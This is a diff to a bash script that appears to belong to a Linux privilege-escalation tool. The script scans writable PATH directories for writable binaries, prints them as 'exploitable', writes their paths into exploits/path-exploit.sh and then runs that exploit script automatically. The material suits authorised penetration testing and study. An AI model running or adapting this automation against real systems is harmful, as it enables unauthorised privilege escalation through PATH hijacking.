@@ -1,6 +1,7 @@
 #! /bin/bash
 
 EXPLOIT=1
+EXPLOITABLE=0
 
 curr_dir=$(pwd)
 
@@ -29,17 +30,21 @@ for dir in $writable_dirs; do
 		if [[ -f "$file" ]]; then
         		writable=$(check_writable "$file" "$EXPLOIT")
 			if [[ "$writable" = true ]]; then
+				echo ${dir}/${file} is exploitable!
         			writable_bins+=${dir}/${file}':'
+				EXPLOITABLE=1
 			fi
                 fi
         done
 done
 
-cd $curr_dir
+cd "$curr_dir"
 
-# writes the exploitable files to the correct exploit file
-sed -i "s#EXPLOITABLE\=.*#EXPLOITABLE\=${writable_bins}#g" exploits/path-exploit.sh
+if [[ "$EXPLOITABLE" == 1 ]]; then
+	# writes the exploitable files to the correct exploit file
+	sed -i "s#exploitable\=.*#exploitable\=${writable_bins}#g" exploits/path-exploit.sh
 
-if [[ "$EXPLOIT" = 1 ]]; then
-        /bin/bash exploits/path-exploit.sh
+	if [[ "$EXPLOIT" = 1 ]]; then
+		/bin/bash exploits/path-exploit.sh
+	fi
 fi
